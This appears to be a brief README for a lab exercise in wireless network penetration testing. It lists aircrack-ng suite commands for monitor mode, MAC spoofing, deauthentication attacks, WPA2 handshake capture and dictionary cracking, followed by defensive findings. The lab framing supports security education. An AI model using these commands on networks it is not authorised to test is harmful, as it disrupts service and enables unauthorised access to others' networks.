# Wireless Network Security Assessment (802.11)

## Overview
This project evaluates vulnerabilities in wireless networks through practical attacks conducted in a controlled lab environment using Kali Linux.

## Tools Used
- Aircrack-ng Suite
- Airodump-ng
- Aireplay-ng
- Macchanger

## Commands Used

### Enable Monitor Mode
```bash
airmon-ng start wlan0

- Capture Packets / Identify Networks
airodump-ng wlan0

- MAC Address Spoofing
ifconfig wlan0 down

- macchanger -m 00:11:22:33:44:55 wlan0
ifconfig wlan0 up

- Deauthentication Attack
aireplay-ng --deauth 50 -a <AP_MAC> -c <CLIENT_MAC> wlan0

- Capture WPA2 Handshake
airodump-ng -c <channel> --bssid <AP_MAC> -w capture wlan0

- Crack WPA2 Password
aircrack-ng -w /usr/share/wordlists/rockyou.txt capture.cap

- Attacks Demonstrated
Hidden SSID discovery
MAC address spoofing
WEP cracking
WPA2 dictionary attack
Deauthentication attack

- Key Findings
Hidden SSIDs offer no real protection
MAC filtering is easily bypassed
Weak passwords compromise WPA2

- Skills Demonstrated
Wireless penetration testing
